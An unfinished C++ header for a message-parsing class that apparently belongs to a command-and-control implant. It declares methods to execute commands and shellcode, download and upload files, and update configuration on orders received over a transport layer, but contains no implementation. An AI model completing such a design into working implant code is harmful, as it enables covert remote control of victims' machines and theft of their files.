/* 
 * MessageParser.h 
 *
 * Purpose: Responsible for handling internal messages (InternalMessage)
 *
 *
 *
 */

// TODO: rename to message parser? and only to message parsing in here? also add call backs to dispatcher

/*  (OWNS execution components) */

// TODO: rename class/file to CommandDispatcher?

#ifndef MESSAGE_PARSER_H
#define MESSAGE_PARSER_H

#include "MessageTypes.h"
#include "Encoder.h"
#include "Serializer.h"

#include "TransportLayer.h"



#include <string>
#include <vector>
#include <cstdint>
#include <functional>
#include <memory>

class TransportLayer;

class MessageParser
{
public:
	
	using ReceiveCallback = std::function<void(const InternalMessage&)>;
	void setOnMessage(ReceiveCallback cb) { receiveCallback_ = std::move(cb); }


	//MessageParser(C2Profile& config) {}; // TODO:
	MessageParser(TransportLayer* transportLayer, Serializer* serializer, Encoder* encoder);

	~MessageParser();

	void start();

	void handle(const RawByteBuffer& data); // TODO: change rawbytebuffer to const? 

	//void handle(const InternalMessage& msg);
    
    bool sendMessage(); // overload this function?
    bool recvMessage(); // overload this function?

	//bool receiveMessages(uint8_t* buffer, size_t bytes_received);

	bool executeCommand(RawByteBuffer& data);
	//bool executeShellcode(RawByteBuffer& data);
	bool executeShellcode(InternalMessage& msg);

	bool downloadFile(RawByteBuffer& data);
	//bool executeFile();
	bool uploadFile(RawByteBuffer& data);
	bool updateConfig(RawByteBuffer& data);
	bool handleServerError(RawByteBuffer& data);
	//bool systemInfo(InternalMessage& msg); // TODO: uncomment when on windows


	// Processes an InternalMessage and use the messageHandler_ based on the InternalMessage's messageType
	void processMessage(InternalMessage& msg);


	//bool handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg);

	// TODO: make wrapper function/methods for these object's functions so i can define them as private vars instead of public? 
	Serializer* serializer_;
	Encoder* encoder_;
	//SerializerUniquePtr serializer_;
	//EncoderUniquePtr encoder_;
private:


	TransportLayer* transportLayer_; // NOTE: pointer is being used instead of a reference because references require immediate initialization

	ReceiveCallback receiveCallback_;

};


typedef std::unique_ptr<MessageParser> MessageParserPtr;

#endif
